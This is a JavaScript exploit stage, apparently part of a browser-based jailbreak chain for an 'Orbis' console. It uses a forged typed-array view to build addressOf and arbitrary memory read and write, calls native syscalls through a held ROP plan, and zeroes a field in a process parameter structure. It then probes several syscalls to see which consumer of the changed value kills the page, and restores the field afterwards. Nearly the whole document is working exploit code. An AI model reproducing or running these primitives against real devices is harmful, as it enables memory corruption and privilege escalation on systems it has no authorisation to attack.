// ProcParam mutation v2 — single mutation (+0x10 u32 0x14008001 ->
// 0x00000000, the value that killed v1) with fine-grained attribution:
// after the mutation write, a 200 ms syscall-free busy-wait separates
// a USERLAND consumer (death before pp3_sleepok) from KERNEL
// consumers (death inside a specific oracle call). Markers 8 of 8,
// oracle values ride in marker strings. Restore + baseline re-check
// submitted only if we survive. Process-local risk, page death
// expected if the v1 killer reproduces.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number" ||
      typeof native.wrappers.sys585 !== "number" ||
      typeof native.wrappers.sys606 !== "number" ||
      typeof native.wrappers.sys607 !== "number" ||
      typeof native.wrappers.sys600 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(addressValue, bytes) {
    if (!Number.isSafeInteger(addressValue) ||
        addressValue % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("write_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function u32At(bytes, off) {
    return ((bytes[off]) | (bytes[off + 1] << 8) |
            (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) >>> 0;
  }
  function u64At(bytes, off) {
    return u32At(bytes, off) + u32At(bytes, off + 4) * 0x100000000;
  }
  function u32Bytes(value) {
    return [value & 255, (value >>> 8) & 255,
            (value >>> 16) & 255, (value >>> 24) & 255];
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("pp3_preflight");
  phase = "call_598";
  var sizePtrOff = 0x1e00, bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  fv.setUint32(sizePtrOff, sizeOrig, true);
  if (call598.value !== 0)
    throw new Error("call598_failed");
  var rootBase = fv.getUint32(bufOff + 4, true) * 0x100000000 +
    fv.getUint32(bufOff, true);
  if (rootBase < 0x1000 || rootBase >= 0x1000000000000 ||
      rootBase % 4096 !== 0)
    throw new Error("root_base_invalid");
  mark("pp3_598ok");
  phase = "snapshot";
  var snap = readAt(rootBase, 192);
  if (snap[8] !== 0x4f || snap[9] !== 0x52 ||
      snap[10] !== 0x42 || snap[11] !== 0x49)
    throw new Error("orbis_magic_missing");
  if (u32At(snap, 0x10) !== 0x14008001)
    throw new Error("param_word_mismatch");
  var ss38 = u64At(snap, 0x38);
  if (ss38 % 8 !== 0)
    throw new Error("substruct_unaligned");
  var ss38orig = readAt(ss38, 8);
  mark("pp3_snapok");
  phase = "ro_gate";
  writeAt(ss38, ss38orig);
  var gatePid = native.call("getpid", []);
  if (gatePid.high !== 0 || gatePid.value !== before.value)
    throw new Error("ro_gate_killed_page");
  if (!same(readAt(ss38, 8), ss38orig))
    throw new Error("ro_gate_readback_mismatch");
  mark("pp3_rook");
  // The mutation under attribution
  phase = "m3_write";
  var m3bytes = [0, 0, 0, 0].concat(ss38orig.slice(4, 8));
  writeAt(ss38, m3bytes);
  mark("pp3_write");
  phase = "quiet_window";
  var t0 = Date.now();
  while (Date.now() - t0 < 200) { /* syscall-free userland wait */ }
  mark("pp3_sleepok");
  phase = "oracle_585";
  var c585 = native.call("sys585", [0, 0, 0, 0, 0, 0]);
  var e585 = (c585.value === -1) ? native.readErrno() : null;
  mark("pp3_o585:" + c585.value + (e585 === null ? "" : "e" + e585));
  phase = "oracle_606";
  var c606 = native.call("sys606", [0, 0, 0, 0, 0, 0]);
  var e606 = (c606.value === -1) ? native.readErrno() : null;
  mark("pp3_o606:" + c606.value + (e606 === null ? "" : "e" + e606));
  phase = "oracle_607";
  var c607 = native.call("sys607", [0, 0, 0, 0, 0, 0]);
  var e607 = (c607.value === -1) ? native.readErrno() : null;
  mark("pp3_o607:" + c607.value + (e607 === null ? "" : "e" + e607));
  phase = "oracle_600";
  var c600 = native.call("sys600", [0, 0, 0, 0, 0, 0]);
  var e600 = (c600.value === -1) ? native.readErrno() : null;
  // Restore immediately after the last oracle
  phase = "restore";
  writeAt(ss38, ss38orig);
  var restOk = same(readAt(ss38, 8), ss38orig);
  // Post-restore oracle re-check (expect baseline values)
  var p585 = native.call("sys585", [0, 0, 0, 0, 0, 0]);
  var p606 = native.call("sys606", [0, 0, 0, 0, 0, 0]);
  var after = native.call("getpid", []);
  result = { id: "procparam_mut3_v1",
    status: (after.value === before.value && after.high === 0 &&
      restOk) ? "pass" : "fail",
    details: { root_base: rootBase.toString(16),
      mutated: "585=" + c585.value +
        (e585 === null ? "" : "e" + e585) +
        " 606=" + c606.value + (e606 === null ? "" : "e" + e606) +
        " 607=" + c607.value + (e607 === null ? "" : "e" + e607) +
        " 600=" + c600.value + (e600 === null ? "" : "e" + e600),
      post_restore: "585=" + p585.value + " 606=" + p606.value,
      pid_ok: after.value === before.value && after.high === 0,
      restored: restOk } };
} catch (error) {
  result = { id: "procparam_mut3_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
